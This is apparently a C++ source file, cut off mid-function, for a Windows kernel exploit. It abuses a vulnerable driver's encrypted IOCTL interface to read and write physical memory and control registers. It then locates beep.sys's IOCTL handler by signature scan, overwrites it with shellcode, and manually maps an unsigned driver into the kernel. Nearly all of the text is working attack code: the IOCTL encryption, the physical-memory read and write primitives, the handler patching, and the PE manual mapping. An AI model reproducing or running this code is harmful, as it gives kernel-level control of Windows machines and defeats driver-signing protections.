#include <string>
#include <vector>
#include <unordered_map>
#include <Shlwapi.h>
#include <Windows.h>
#include <winternl.h>
#include <conio.h>

#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>

#include <intrin.h>
#include "pdbparser.h"


//#include "proto.h"



typedef struct MyIrpStruct
{
    // address of krnl module
    void* ntoskrnl;

    // addresses of these functions
    void (*nt_memcpy)(void* dst, void* src, size_t len);
    void* (*nt_ExAllocatePoolWithTag)(ULONG PoolType, SIZE_T NumberOfBytes, ULONG Tag);
    NTSTATUS(*nt_PsCreateSystemThread)(PHANDLE ThreadHandle, ULONG DesiredAccess, void* ObjectAttributes, HANDLE ProcessHandle, void* ClientId, void* StartRoutine, PVOID StartContext);
    void* nt_IofCompleteRequest;

    // offset to these functions are found using pdb parser in exploit. They are NOT EXPORTED from ntoskrnl which is why we gotta do this
    uintptr_t nt_MiLookupDataTableEntry;
    uintptr_t nt_PsGetNextProcess;
    uintptr_t nt_ExUnlockHandleTableEntry;

    // address of driver object once it gets allocated
    void* my_driver;

    // payload (which will just be the entire manualmapped "MyDriver1.sys")
    SIZE_T payload_size;
    UCHAR payload[];
} MyIrpStruct;

typedef struct _RELOCATION_ENTRY
{
    unsigned Type : 4;
    unsigned Offset : 12;
};

// derived this by reversing the subtractions, aka solving "x - 2287708 - 5*4 = 0"
#define WRITE_CR_OPCODE 0x22E870
#define READ_CR_OPCODE 0x22E86C // this is a subtraction of 4 up
#define READ_PHYS_MEM_OPCODE 0x22E808
#define WRITE_PHYS_MEM_OPCODE 0x22E80C // write is higher up in the code but nested in 1 more if statement, hence its +4
#define FOUR_KB 0x1000

typedef uint64_t QWORD;

BYTE my_shellcode[FOUR_KB];
// handles to two drivers
HANDLE hDevice;
HANDLE hBeep;

size_t my_shellcode_data_sz = 0;

// the IRP that we will pass into our driver (contains a bunch of function pointer, aka addresses to functions in ntoskrnl.exe)
// also comes with a payload section that we can populate with whatever shellcode we want, 
// with kernel privs, in the driver IRP control function
MyIrpStruct* my_shellcode_data = 0;

void __declspec(noreturn) bye()
{
    printf("Press any key to exit\n");
    (void)_getwche();
    exit(0);
}

void hexdump(unsigned char* buf, size_t len)
{
    for (int i = 0; i < len; i++)
        printf("%02x ", buf[i]);
    printf("\n");
}



// struct stolen from https://githacks.org/_xeroxz/vdm/-/blob/master/VDM/util/util.hpp
#pragma pack (push, 1)
struct PhysicalMemoryPage//CM_PARTIAL_RESOURCE_DESCRIPTOR
{
    uint8_t type;
    uint8_t shareDisposition;
    uint16_t flags;
    uint64_t pBegin;
    uint32_t sizeButNotExactly;
    uint32_t pad;

    static constexpr uint16_t cm_resource_memory_large_40{ 0x200 };
    static constexpr uint16_t cm_resource_memory_large_48{ 0x400 };
    static constexpr uint16_t cm_resource_memory_large_64{ 0x800 };

    uint64_t size()const noexcept
    {
        if (flags & cm_resource_memory_large_40)
            return uint64_t{ sizeButNotExactly } << 8;
        else if (flags & cm_resource_memory_large_48)
            return uint64_t{ sizeButNotExactly } << 16;
        else if (flags & cm_resource_memory_large_64)
            return uint64_t{ sizeButNotExactly } << 32;
        else
            return uint64_t{ sizeButNotExactly };
    }

};
static_assert(sizeof(PhysicalMemoryPage) == 20, "PhysicalMemoryPage size wrong");
#pragma pack (pop)


struct physical_memory_layout_info_t {
    QWORD idk;
    QWORD idk2;
    ULONG count;
    PhysicalMemoryPage pmi[];
} *physical_memory_layout_info = NULL;

#pragma pack(push, 1)
struct ioctl_header
{
    WORD pad;
    DWORD iv_size;
    unsigned __int8 iv[21];
    unsigned __int8 key[16];
    unsigned __int8 pad2[3]; // alignment i guess
};

struct ioctl_footer
{
    DWORD cmd_size;
    WORD pad;
};
#pragma pack(pop)


void PrepareIoctlData(void* cmd_in, size_t cmd_size, PVOID* pIoctl_data_out, size_t* buf_size_out)
{
    ioctl_header hdr;
    RtlZeroMemory(&hdr, sizeof(hdr));

    memset(hdr.iv, 0x69, sizeof(hdr.iv));
    memset(hdr.key, 0x69, sizeof(hdr.key));
    hdr.iv_size = sizeof(hdr.iv);

    //printf("input size is %zd\n", cmd_size);

    DWORD cbEncrypted;
    BYTE* my_cipher;

    BCRYPT_ALG_HANDLE hAlgorithm;
    DWORD result = BCryptOpenAlgorithmProvider(&hAlgorithm, L"AES", 0i64, 0);// BCRYPT_AES_ALGORITHM
    //printf("BCryptOpenAlgorithmProvider -> %d\n", result);
    //printf("hAlgorithm = %p\n", hAlgorithm);

    BYTE enc_key[32];
    memset(enc_key, 0, sizeof(enc_key));
    memmove(enc_key, "C110DD4FE9434147B92A5A1E3FDBF29A", 32ui64);
    *(__m128i*)& enc_key[13] = _mm_loadu_si128((const __m128i*)hdr.key);

    HANDLE hKey;
    result = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, 0i64, 0, enc_key, 0x20u, 0);
    //printf("BCryptGenerateSymmetricKey -> %d\n", result);

    BYTE* ivCopy = (BYTE*)malloc(hdr.iv_size);
    memcpy(ivCopy, hdr.iv, hdr.iv_size);

    size_t cipher_buf_size = cmd_size + 64; // Lmao.
    my_cipher = (BYTE*)calloc(1, cipher_buf_size);

    result = BCryptEncrypt(hKey, (BYTE*)cmd_in, cmd_size, 0, ivCopy, hdr.iv_size, my_cipher, cipher_buf_size, &cbEncrypted, BCRYPT_BLOCK_PADDING);

    //printf("BCryptEncrypt -> %x\n", result);
    //printf("We encrypted %d bytes\n", cbEncrypted);


    size_t buf_size = sizeof(ioctl_header) + cbEncrypted + sizeof(ioctl_footer);
    BYTE* buf = (BYTE*)calloc(1, buf_size);
    memcpy(buf, &hdr, sizeof(hdr));
    memcpy(buf + sizeof(hdr), my_cipher, cbEncrypted);
    ioctl_footer* footer = (ioctl_footer*)(buf + buf_size - sizeof(ioctl_footer));
    footer->cmd_size = cbEncrypted; // copying the size of encrypted buffer into the cmd_size field so that when we pass into the ioctl, it will know when it calculates input size (it expects this at -6 offset from the end of the ioctl struct)

    *pIoctl_data_out = buf;
    *buf_size_out = buf_size;
}


#pragma pack(push, 1)
union rweverything_args
{
    unsigned __int8 char_args[24];
    unsigned __int16 word_args[12];
    DWORD dword_args[6];
    uint64_t qword_args[3];
};

struct driver_cmd
{
    unsigned int opcode;
    int pad;
    rweverything_args args;
};
#pragma pack(pop)


void print_buf(void* buf, size_t len) {
    if (len < 0) {
        printf("Negative buffer length\n");
        return;
    }
    for (size_t i = 0; i < len; i++) {
        printf("0x%02X ", ((unsigned char*)buf)[i]);
    }
    printf("\n");
}

BOOL GetDriverOutput(driver_cmd command, void** out, size_t* output_len) {
    void* input_ptr;

    size_t input_buffer_len;

    const size_t output_buf_sz = FOUR_KB;
    uint8_t output_buffer[output_buf_sz]; // try to use stack buffers as much as possible to save memory
    ULONG output_buffer_len;
    PrepareIoctlData(&command, sizeof(command), &input_ptr, &input_buffer_len);

    // printf("Sending %d bytes into driver\n", input_buffer_len);
    // print_out_buffer(input_ptr, input_buffer_len);
    // printf("\n");
    BOOL ret = DeviceIoControl(hDevice, 0x22EC00, input_ptr, input_buffer_len, output_buffer, output_buf_sz, &output_buffer_len, NULL);

    if (ret != 1) { // returns 1 if success
      // printf("DeviceIoControl: %d\n", ret);
        return ret;
    }

    // if we get a 1 then we know the output is valid, allocate a new buffer and copy mem to it, then set the double ptr
    // out to point to this newly made buffer
    if (out != NULL) {
        *out = malloc(output_buffer_len);
        memcpy(*out, output_buffer, output_buffer_len);
        if (output_len != NULL) {
            *output_len = output_buffer_len;
        }
    }

    // printf("Buffer output is %ul bytes\n", output_buffer_len);

    if ((LONG)output_buffer_len < 0) {
        return ret;
    }
    // print_out_buffer(output_buffer, output_buffer_len);
    return ret;
}

void WriteControlRegister(DWORD crNum, uint64_t val) {
    driver_cmd my_cmd;
    memset((void*)&my_cmd, 0, sizeof(driver_cmd));
    my_cmd.opcode = WRITE_CR_OPCODE;
    my_cmd.args.dword_args[0] = crNum;
    my_cmd.args.qword_args[1] = val;
    GetDriverOutput(my_cmd, NULL, NULL);
}

uint64_t ReadControlRegister(DWORD crNum) {
    driver_cmd my_cmd;
    memset((void*)&my_cmd, 0, sizeof(driver_cmd));
    my_cmd.opcode = READ_CR_OPCODE;
    my_cmd.args.dword_args[0] = 3;

    // we dont know what the size of the output buffer will be from drivercall
    // so we will dynamically allocate it in GetDriverOutput after we receive
    // the output buffer
    void* output;
    size_t output_len;
    GetDriverOutput(my_cmd, &output, &output_len);
    uint64_t crx = *(uint64_t*)((BYTE*)output + 8); // +8 because of IDA

    return crx;
}

// effect: reads len bytes starting at specified physical address into buf
BOOL ReadPhysicalMemory(uint64_t physical_address, DWORD len, void* buf) {
    driver_cmd my_cmd;
    memset((void*)&my_cmd, 0, sizeof(driver_cmd));
    my_cmd.opcode = READ_PHYS_MEM_OPCODE;
    my_cmd.args.qword_args[0] = physical_address;// bytes 0-8
    my_cmd.args.qword_args[2] = (uint64_t)buf; // 16 - 24
    my_cmd.args.dword_args[2] = len; // 8-12
    my_cmd.args.dword_args[3] = 0; // granularity (byte) 12-16

    return GetDriverOutput(my_cmd, NULL, NULL);
}

// effect: writes len bytes of buf into the specified physical address
BOOL WritePhysicalMemory(uint64_t physical_address, DWORD len, void* buf) {
    driver_cmd my_cmd;
    memset((void*)&my_cmd, 0, sizeof(driver_cmd));
    my_cmd.opcode = WRITE_PHYS_MEM_OPCODE;
    my_cmd.args.qword_args[0] = physical_address;
    my_cmd.args.qword_args[2] = (uint64_t)buf;
    my_cmd.args.dword_args[2] = len;
    my_cmd.args.dword_args[3] = 0; // granularity (byte)

    return GetDriverOutput(my_cmd, NULL, NULL);
}



// page offset of our victim ioctl handler in beep.sys
QWORD ioctl_handler_pageOffset = 0x290;

BOOL found_ioctl = FALSE;

struct code_backup_t
{
    uint64_t phys_addr;
    BYTE page_contents[0x1000];
};

std::vector<code_backup_t> beepBackup;

// scans PHYSICAL MEMORY from start -> end, at offset function_offset, for the pattern listed below
void ScanMemoryRangeForBeep(uint64_t start, uint64_t end) {
    // Untitled1 (5/5/2022 1:02:20 AM) Made using HxD
    // StartOffset(h): 00000000, EndOffset(h): 00000034, Length(h): 00000035
    unsigned char beepSigScanPattern[53] = {
        0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x4C, 0x8B, 0x82, 0xB8, 0x00, 0x00,
        0x00, 0x4C, 0x8B, 0xD2, 0x41, 0x8B, 0x40, 0x18, 0x2D, 0x00, 0x00, 0x01,
        0x00, 0x0F, 0x84, 0x63, 0x04, 0x00, 0x00, 0x83, 0xF8, 0x04, 0x0F, 0x85,
        0x4A, 0x04, 0x00, 0x00, 0x33, 0xC0, 0x41, 0x83, 0x78, 0x08, 0x08, 0x0F,
        0x82, 0x46, 0x04, 0x00, 0x00
    };


    uint64_t function_offset = 0x290; // found in IDA
    const size_t buf_size = 0x10000;
    BYTE buf[buf_size];

    int cnt = 0;
    // NOTE: ptr is in PHYSICAL memory, buf is in VIRTUAL memory
    for (uint64_t ptr = start; ptr < end; ptr += buf_size) {
        cnt++;
        if (cnt % 10000 == 0) {
            printf("Scanning %#llx to %#llx\r", ptr, ptr + buf_size);
            cnt = 0;
        }

        NTSTATUS val = ReadPhysicalMemory(ptr, buf_size, buf);

        // printf("Physical memory at %p\n", ptr);
        // print_out_buffer(buf, sizeof(buf));

        // scan the buffer for the pattern in 4KB page increments for the signature at offset function_offset
        for (uint64_t i = 0; i < buf_size; i += FOUR_KB) {
            uint64_t addr = ((uint64_t)buf + i + function_offset);
            uint64_t phys_addr = ((uint64_t)ptr + i + function_offset);

            // printf("Comparing at physical address: %#llx\n", (uint64_t)ptr + i + function_offset);
            if (memcmp((BYTE*)addr, beepSigScanPattern, sizeof(beepSigScanPattern)) == 0) {
                // found pattern


                printf("Found Beep at physical address: %#llx\n", phys_addr);
                print_buf((BYTE*)buf + i + function_offset, 20);

                // save old pattern (should be the same every time)
                code_backup_t oldBeepHandler;
                oldBeepHandler.phys_addr = ptr + i; // the address of the PAGE 
                memcpy(oldBeepHandler.page_contents, (BYTE*)(buf + i), FOUR_KB);
                beepBackup.push_back(oldBeepHandler);

                // overwrite this with our driver's IOCTL handler's assembly. Write as much of it as possible, until    the end of the page
                WritePhysicalMemory(phys_addr, FOUR_KB - function_offset, my_shellcode);

                char buf[20];
                printf("The memory after patching:\n");
                ReadPhysicalMemory(phys_addr, 20, &buf);
                print_buf(buf, 20);

                found_ioctl = TRUE;

            }
        }
    }

}

void patch_beep()
{
    // Beep(440, 10);

    // 1. Scan physical memory for Beep.sys
    // 2. Overwrite the ioctl handler of Beep.sys in physical memory with our shellcode
    // 3. In shellcode we call ntoskrnl.exe!memcpy with controlled arguments (from IRP)
    // 4. Now we have arb write primitive
    // 5. then do the rest of the shit

    for (unsigned i = 0; i < physical_memory_layout_info->count; i++)
    {
        uint64_t start = physical_memory_layout_info->pmi[i].pBegin;
        uint64_t end = start + physical_memory_layout_info->pmi[i].size();
        ScanMemoryRangeForBeep(start, end);
    }

    if (!found_ioctl)
    {
        printf("didn't find beep.sys\n");
        bye();
    }
    return;
}

enum EXPLOIT_TYPE {
    MALICIOUS_IOCTL_HANDLER,
    SYSTEM_PRIVS,
};

void call_hacked_driver() {

    printf("\nCalling driver with input size %d bytes\n", my_shellcode_data_sz);
    // print_buf(my_shellcode_data, my_shellcode_data_sz);

    printf("ready kids?\n");

    fflush(stdout);
    _getwche();

    char out_buf[16]; // doesnt really matter
    DWORD bytes_returned;

    BOOL result = DeviceIoControl(hBeep, 0x1234, my_shellcode_data, my_shellcode_data_sz, out_buf, sizeof(out_buf), &bytes_returned, NULL);
    printf("trigger DeviceIoControl returns %d\n", result);
    printf("Output buffer:\n");
    print_buf(out_buf, 16);

    // restore smashed beep code
    for (int i = 0; i < beepBackup.size(); i++)
    {
        WritePhysicalMemory(beepBackup[i].phys_addr, 0x1000, beepBackup[i].page_contents);
        printf("restored code at %p\n", (void*)beepBackup[i].phys_addr);
    }

    /*
    avoiding fault in windbg:

    0: kd> u MiShowBadMapper L20
    nt!MiShowBadMapper:
    fffff801`0a141ac4 48895c2410      mov     qword ptr [rsp+10h],rbx
    fffff801`0a141ac9 48896c2418      mov     qword ptr [rsp+18h],rbp
    fffff801`0a141ace 4889742420      mov     qword ptr [rsp+20h],rsi
    fffff801`0a141ad3 57              push    rdi
    fffff801`0a141ad4 4881ec90000000  sub     rsp,90h
    fffff801`0a141adb 488b050e511600  mov     rax,qword ptr [nt!_security_cookie (fffff801`0a2a6bf0)]
    fffff801`0a141ae2 4833c4          xor     rax,rsp
    fffff801`0a141ae5 4889842480000000 mov     qword ptr [rsp+80h],rax
    fffff801`0a141aed 8a1de7ad1900    mov     bl,byte ptr [nt!MiState+0x1eda (fffff801`0a2dc8da)]

    then write 2 to nt!MiState+0x1eda (fffff801`0a2dc8da
    eb  fffff801`0a2dc8da 2

    */
}

// populates the physical_memory_layout struct, also displays some nice info about memory on the system
void ScanPhysicalMemory() {
    printf("\nQuerying Memory Info on this Machine...\n");
    HKEY h_key;
    DWORD type, size = 0;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory", 0, KEY_READ, &h_key);
    RegQueryValueEx(h_key, ".Translated", NULL, &type, NULL, &size); //get size
    if (!size)
    {
        printf("WTf can't open the key\n");
        bye();
    }
    BYTE* data = (BYTE*)malloc(size);
    RegQueryValueEx(h_key, ".Translated", NULL, &type, (BYTE*)data, &size);
    physical_memory_layout_info = (physical_memory_layout_info_t*)data;

    ULONG count = physical_memory_layout_info->count;
    if (!count)
    {
        printf("Query physical memory layout failed?\n");
        bye();
    }
    uint64_t total_pmem = 0;
    for (unsigned i = 0; i < count; i++)
    {
        uint64_t end = physical_memory_layout_info->pmi[i].pBegin + physical_memory_layout_info->pmi[i].size();
        printf("%#llx - %#llx , type %02x , flags %04x , sharing %02x, size %llf GB\n", (uint64_t)physical_memory_layout_info->pmi[i].pBegin, (uint64_t)end, physical_memory_layout_info->pmi[i].type, physical_memory_layout_info->pmi[i].flags, physical_memory_layout_info->pmi[i].shareDisposition, (double)physical_memory_layout_info->pmi[i].size() / 1e9);
        total_pmem += physical_memory_layout_info->pmi[i].size();
    }
    printf("you seem to have %.1f GB physical memory mapped\n", (double)total_pmem / 1e9);
}

std::unordered_map<std::string, uint64_t> KernelModules;

BOOL APIENTRY LoadDriver_setup_shellcode_data(LPCSTR szPath) {
    int NonPagedPoolExecute = 0;

    LPVOID hFile = CreateFileA(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        puts("Invalid handle when map PE file");
        bye();
        return NULL;
    }

    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, NULL);

    if (!hMapping) {
        puts("Cannot make file mapping");
        bye();
        return NULL;
    }

    LPVOID lpBase = (char*)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!lpBase) {
        puts("Cannot make MapViewOfFile");
        bye();
        return NULL;
    }

    PIMAGE_DOS_HEADER image = (PIMAGE_DOS_HEADER)lpBase;
    if (image->e_magic != IMAGE_DOS_SIGNATURE) {
        puts("IMAGE_DOS_SIGNATURE not matched");
        bye();
        return NULL;
    }

    PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS)((uintptr_t)lpBase + image->e_lfanew);
    if (pe->Signature != IMAGE_NT_SIGNATURE) {
        puts("IMAGE_NT_SIGNATURE not matched");
        bye();
        return NULL;
    }

    LPVOID mapping = VirtualAlloc(nullptr, pe->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    printf("mapping = %p size %x\n", mapping, pe->OptionalHeader.SizeOfImage);

    int num_sections = pe->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER* hdr = (IMAGE_SECTION_HEADER*)((uintptr_t)&pe->OptionalHeader + pe->FileHeader.SizeOfOptionalHeader);

    // map the fuckeign sections! :)
    memcpy(mapping, image, pe->OptionalHeader.SizeOfHeaders);
    for (int i = 0; i < num_sections; i++, hdr++) {
        void* src = (void*)((uintptr_t)image + hdr->VirtualAddress);
        void* dst = (void*)((uintptr_t)mapping + hdr->VirtualAddress);
        size_t size = hdr->SizeOfRawData;
        memset(dst, 0, size);
        memcpy(dst, src, size);

        char name[9];
        name[8] = 0;
        memcpy(name, hdr->Name, 8);
        printf("we map section %s (fileoffset %x to va %x-%x)\n", name, hdr->PointerToRawData, hdr->VirtualAddress, (uintptr_t)hdr->VirtualAddress + size);
    }

    // resolve the importsss

    IMAGE_DATA_DIRECTORY* imports_dir_info = &pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    printf("imports dir va = %x\n", imports_dir_info->VirtualAddress);

    if (imports_dir_info->VirtualAddress)
    {
        IMAGE_IMPORT_DESCRIPTOR* imports_dir = (IMAGE_IMPORT_DESCRIPTOR*)((uintptr_t)mapping + imports_dir_info->VirtualAddress);

        while (true)
        {
            if (imports_dir->Characteristics == 0)
            {
                printf("done\n");
                break;
            }

            PSTR moduleName = (PSTR)((uintptr_t)mapping + imports_dir->Name);

            printf("imports for %s\n", moduleName);

            HMODULE hModule = GetModuleHandleA(moduleName);

            if (!hModule)
            {
                hModule = LoadLibraryExA(moduleName, NULL, DONT_RESOLVE_DLL_REFERENCES | LOAD_LIBRARY_SEARCH_DEFAULT_DIRS);
            }

            if (!hModule)
            {
                printf("failed to map %s\n", moduleName);
                bye();
            }

            printf("%s at %p\n", moduleName, hModule);

            IMAGE_THUNK_DATA* importLookupTable = (PIMAGE_THUNK_DATA)((uintptr_t)mapping + imports_dir->OriginalFirstThunk);
            void** iat = (void**)((uintptr_t)mapping + imports_dir->FirstThunk);

            while (importLookupTable->u1.AddressOfData)
            {
                bool is_by_ordinal = importLookupTable->u1.AddressOfData >> 63;
                if (is_by_ordinal)
                {
                    puts("Sorry import by ordinal isnt supportd xD");
                    bye();
                }
                _IMAGE_IMPORT_BY_NAME* import_name = (_IMAGE_IMPORT_BY_NAME*)((uintptr_t)mapping + importLookupTable->u1.AddressOfData);
                PSTR name = import_name->Name;
                printf("do import %s\n", name);

                uintptr_t offset = (uintptr_t)GetProcAddress(hModule, name) - (uintptr_t)hModule;
                printf("%s = %p + %p\n", name, KernelModules[moduleName], offset);
                uintptr_t resolved_import = KernelModules[moduleName] + offset;
                *iat = (void*)resolved_import;

                importLookupTable++;
                iat++;
            }

            imports_dir++;
        }
    }

    // check relocs

    IMAGE_DATA_DIRECTORY* reloc_dir_info = &pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    IMAGE_BASE_RELOCATION* relocs = (IMAGE_BASE_RELOCATION*)((uintptr_t)mapping + reloc_dir_info->VirtualAddress);

    uintptr_t basediff = (uintptr_t)mapping - pe->OptionalHeader.ImageBase;

    void* relocs_end = (void*)((uintptr_t)relocs + reloc_dir_info->Size);
    while (relocs < relocs_end)
    {
        ULONG va = relocs->VirtualAddress;
        USHORT* entries = (USHORT*)((uintptr_t)relocs + sizeof(IMAGE_BASE_RELOCATION));
        int num_entries = (relocs->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
        printf("page %x has %d relocs\n", va, num_entries);
        for (int i = 0; i < num_entries; i++)
        {
            USHORT entry = entries[i];
            USHORT reloc_type = entry >> 12;
            uintptr_t reloc_offset = (uintptr_t)(entry & 0xfff);
            if (reloc_type == IMAGE_REL_BASED_DIR64)
            {
                printf("IMAGE_REL_BASED_DIR64 at offset %x+%llx\n", va, reloc_offset);
            }
            else if (reloc_type == IMAGE_REL_BASED_ABSOLUTE)
            {
                printf("IMAGE_REL_BASED_ABSOLUTE at offset %x+%llx\n", va, reloc_offset);
            }
            else
            {
                printf("reloc type %d is NOT supported!\n", reloc_type);
                bye();
            }
        }
        relocs = (IMAGE_BASE_RELOCATION*)((uintptr_t)relocs + relocs->SizeOfBlock);
    }

    size_t payload_sz = pe->OptionalHeader.SizeOfImage;
    my_shellcode_data_sz = sizeof(MyIrpStruct) + payload_sz;
    my_shellcode_data = (MyIrpStruct*)malloc(my_shellcode_data_sz);
    if (!my_shellcode_data)
    {
        printf("malloc fails\n");
        bye();
    }
    memcpy(my_shellcode_data->payload, mapping, payload_sz);
    my_shellcode_data->payload_size = payload_sz;
    printf("fake irp handler data block size = %llx\n", my_shellcode_data_sz);

    return TRUE;
}


// This function just populates KernelModules array with the addresses of each module
void Enum_kernel_modules()
{
    printf("\n");
    typedef NTSTATUS(*NtQuerySystemInformation_t)(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength);

    // get NtQuerySystemInformation from export (alternatively just add ntdll.lib)
    NtQuerySystemInformation_t pNtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(GetModuleHandleA("ntdll"), "NtQuerySystemInformation");


    constexpr int SystemModuleInformation = 0xb;
    ULONG bytes = 0;
    // get size of output first
    NTSTATUS status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, 0, bytes, &bytes);
    if (!bytes)
    {
        printf("NtQuerySystemInformation fails 1\n");
        bye();
    }

    typedef struct _SYSTEM_MODULE_ENTRY
    {
        HANDLE Section;
        PVOID MappedBase;
        PVOID ImageBase;
        ULONG ImageSize;
        ULONG Flags;
        USHORT LoadOrderIndex;
        USHORT InitOrderIndex;
        USHORT LoadCount;
        USHORT OffsetToFileName;
        UCHAR FullPathName[256];

    }   SYSTEM_MODULE_ENTRY, * PSYSTEM_MODULE_ENTRY;

    typedef struct _SYSTEM_MODULE_INFORMATION
    {
        ULONG                 ModulesCount;
        SYSTEM_MODULE_ENTRY   Modules[0];

    }   SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

    PSYSTEM_MODULE_INFORMATION pMods = (PSYSTEM_MODULE_INFORMATION)malloc(bytes);
    RtlZeroMemory(pMods, bytes);
    status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, pMods, bytes, &bytes);
    if (status < 0)
    {
        puts("NtQuerySystemInformation fails 2");
        bye();
    }
    printf("there are %u modules\n", pMods->ModulesCount);

    for (unsigned i = 0; i < pMods->ModulesCount; i++)
    {
        const char* filename = PathFindFileNameA((const char*)pMods->Modules[i].FullPathName);
        KernelModules[filename] = (uint64_t)pMods->Modules[i].ImageBase;
        printf("%s %016llx\n", filename, KernelModules[filename]);
    }
}

// pass in the name of a file that you want to manual map. 
// Effect: also populates my_shellcode_data by allocating memory and copying in the manual mapped driver into payload section
// Also manually maps the raw addresses into virtual ones in the current process. (for example 0x400-0x800 -> 0x1000-0x1400 for .text from start of module which is lpBase)
BOOL APIENTRY manual_map(LPCSTR name) {

    // 1. Open the file and get HANDLE to it
    HANDLE hFile = CreateFileA(name, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        puts("Invalid handle when map PE file");
        printf("GetLastError: %d\n", GetLastError());
        bye();
    }

    // 2. Create File Mapping Object
    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, NULL);
    if (!hMapping) {
        puts("Cannot make file mapping");
        printf("GetLastError: %d\n", GetLastError());
        bye();
    }

    // 3. Get the base address of where it was loaded in the current process
    LPVOID lpBase = (char*)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!lpBase) {
        puts("Cannot make MapViewOfFile");
        printf("GetLastError: %d\n", GetLastError());
        bye();
    }

    printf("%s loaded at %#llx in current process\n", name, lpBase);

    // 4. Cast base address to a DOS HEADER
    PIMAGE_DOS_HEADER image = (PIMAGE_DOS_HEADER)lpBase;
    if (image->e_magic != IMAGE_DOS_SIGNATURE) {
        puts("IMAGE_DOS_SIGNATURE not matched");
        printf("GetLastError: %d\n", GetLastError());
        bye();
    }

    // 5. Get the NT Header start address
      // pe header is offset by e_lfanew. Virtual addresses ar eusually relative to this.
    PIMAGE_NT_HEADERS fileHeader = (PIMAGE_NT_HEADERS)((uintptr_t)lpBase + image->e_lfanew);
    if (fileHeader->Signature != IMAGE_NT_SIGNATURE) {
        puts("IMAGE_NT_SIGNATURE not matched");
        printf("GetLastError: %d\n", GetLastError());
        bye();
    }

    // allocate some memory for us to map the DLL into
    void* some_memory = VirtualAlloc(NULL, fileHeader->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    // void* some_memory = ExAllocatePoolWithTag(NonPagedPoolExecute, imageSize, (ULONG)"hi");
    printf("Memory allocated at %#llx\n", some_memory);

    int NonPagedPoolExecute = 0;


    // section is like .text, .rdata, etc.
    WORD nSections = fileHeader->FileHeader.NumberOfSections;

    // array of section headers begins right after optional header
    IMAGE_SECTION_HEADER* sectionHeaders = (IMAGE_SECTION_HEADER*)((uintptr_t)&fileHeader->OptionalHeader + fileHeader->FileHeader.SizeOfOptionalHeader);

    // where the image is loaded. If not at this address, patching occurs (for jmp instructions)
    DWORD imageBase = fileHeader->OptionalHeader.ImageBase;

    //DWORD relocTableSize = fileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    //DWORD relocTableRVA = fileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    //DWORD importTableSize = fileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
    //DWORD importTableRVA = fileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    //DWORD entryPointRVA = fileHeader->OptionalHeader.AddressOfEntryPoint;

    // how big the image is including all headers
    DWORD imageSize = fileHeader->OptionalHeader.SizeOfImage;

    memcpy(some_memory, image, fileHeader->OptionalHeader.SizeOfHeaders);
    // map each section- like .text, .rdata, etc.
    for (int i = 0; i < nSections; i++) {

        // the sections are located at offsets equal to the "VirtualAddress" field, from the start of the image.
        void* src = (void*)((uintptr_t)image + sectionHeaders->VirtualAddress);
        void* dst = (void*)((uintptr_t)some_memory + sectionHeaders->VirtualAddress);

        size_t sz = sectionHeaders->SizeOfRawData;
        memcpy(dst, src, sz);
        printf("Mapping %d bytes to %#llx from %#llx- section %s\n", sz, dst, src, (char*)&sectionHeaders->Name);
        sectionHeaders++;
    }

    // IMG DATA DIRECTORY from Optional Header (addr and size of table)
    IMAGE_DATA_DIRECTORY* import_directory_info = (IMAGE_DATA_DIRECTORY*)&fileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    // import descriptor inside of table (and was already mapped above). The table is terminated with a null
    IMAGE_IMPORT_DESCRIPTOR* import_descriptor = (IMAGE_IMPORT_DESCRIPTOR*)((uintptr_t)some_memory + import_directory_info->VirtualAddress);

    // loop through all import descriptors (one for each module) until null
    while (true) {
        if (import_descriptor->Characteristics == 0) {
            // done
            break;
        }
        char* name_of_module = (char*)((uintptr_t)some_memory + import_descriptor->Name);

        // get da required module's handle. Should work since we memcpy'd each required module already into memory?
        HMODULE hModule = GetModuleHandleA(name_of_module);
        if (!hModule) {
            hModule = LoadLibraryEx(name_of_module, NULL, DONT_RESOLVE_DLL_REFERENCES | LOAD_LIBRARY_SEARCH_DEFAULT_DIRS);
            if (!hModule) {
                printf("Couldn't get handle to module %s\n", name_of_module);
                bye();
            }
        }
        printf("\n");
        printf("Loaded module %s at %#llx, real addr %#llx \n", name_of_module, hModule, KernelModules[name_of_module]);

